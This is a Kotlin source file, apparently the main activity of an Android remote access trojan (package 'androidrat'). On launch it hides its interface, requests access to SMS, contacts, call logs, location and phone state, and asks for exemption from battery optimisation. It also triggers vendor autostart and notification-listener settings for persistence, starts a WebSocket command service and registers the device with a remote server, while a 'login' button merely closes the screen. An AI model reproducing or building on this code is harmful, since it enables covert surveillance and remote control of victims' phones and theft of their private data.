package com.nqmgaming.androidrat

import android.Manifest
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.Window
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.nqmgaming.androidrat.command.DeviceInfo
import com.nqmgaming.androidrat.command.util.AppInfo
import com.nqmgaming.androidrat.data.ApiService
import com.nqmgaming.androidrat.databinding.ActivityMainBinding
import com.nqmgaming.androidrat.receivers.JobWakeUpService
import com.nqmgaming.androidrat.service.WebSocketService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.awaitResponse
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    @Inject
    lateinit var apiService: ApiService
    private lateinit var binding: ActivityMainBinding

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        this.supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
        this.window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        supportActionBar?.hide()
        setContentView(binding.root)
        checkPermission()
        val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
        if (isFirstRun.getBoolean(AppInfo.FirstRunKey, true)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                removeBatterOpt()
            }
            addAutoStartup()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            val changeRunEntry = isFirstRun.edit()
            changeRunEntry.putBoolean(AppInfo.FirstRunKey, false)
            changeRunEntry.apply()
        }
        val webSocketService = WebSocketService::class.java
        val commandline = Intent(applicationContext, webSocketService)
        startService(commandline)
        startService(Intent(applicationContext, JobWakeUpService::class.java))
        sendRegistrationRequest()
        binding.btnLogin.setOnClickListener {
            finish()
        }
    }


    @SuppressLint("BatteryLife")
    @RequiresApi(Build.VERSION_CODES.M)
    private fun removeBatterOpt() {
        val intent = Intent()
        val packageName = this.packageName
        val pm = this.getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) intent.action =
            Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS else {
            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            intent.data = Uri.parse("package:$packageName")
        }
        this.startActivity(intent)
    }

    private fun checkPermission() {
        val permissionCode = 1
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            arrayOf<String>(
                Manifest.permission.INTERNET,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.QUERY_ALL_PACKAGES,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.SET_WALLPAPER,
                Manifest.permission.SEND_SMS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS
            )
        } else {
            arrayOf<String>(
                Manifest.permission.INTERNET,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.SET_WALLPAPER,
                Manifest.permission.SEND_SMS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
            )
        }
        if (!hasPermissions(this, *permission)) {
            ActivityCompat.requestPermissions(this, permission, permissionCode)
        }
    }

    private fun hasPermissions(context: Context?, vararg permissions: String?): Boolean {
        if (context != null) {
            for (permission in permissions) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        permission!!
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    return false
                }
            }
        }
        return true
    }

    @SuppressLint("QueryPermissionsNeeded")
    private fun addAutoStartup() {
        try {
            val intent = Intent()
            val manufacturer = Build.MANUFACTURER
            when {
                "xiaomi".equals(manufacturer, ignoreCase = true) -> {
                    intent.component = ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    )
                }

                "oppo".equals(manufacturer, ignoreCase = true) -> {
                    intent.component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                }

                "vivo".equals(manufacturer, ignoreCase = true) -> {
                    intent.component = ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    )
                }

                "Letv".equals(manufacturer, ignoreCase = true) -> {
                    intent.component = ComponentName(
                        "com.letv.android.letvsafe",
                        "com.letv.android.letvsafe.AutobootManageActivity"
                    )
                }

                "Honor".equals(manufacturer, ignoreCase = true) -> {
                    intent.component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
                    )
                }
            }
            val list =
                packageManager.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY)
            if (list.size > 0) {
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(AppInfo.TAG, e.toString())
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun sendRegistrationRequest() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.register(DeviceInfo.createDeviceInfo())
                response.awaitResponse().let {
                    if (it.isSuccessful) {
                        println("Device registered successfully")
                    } else {
                        println("Failed to register device: ${it.errorBody()?.string()}")
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

}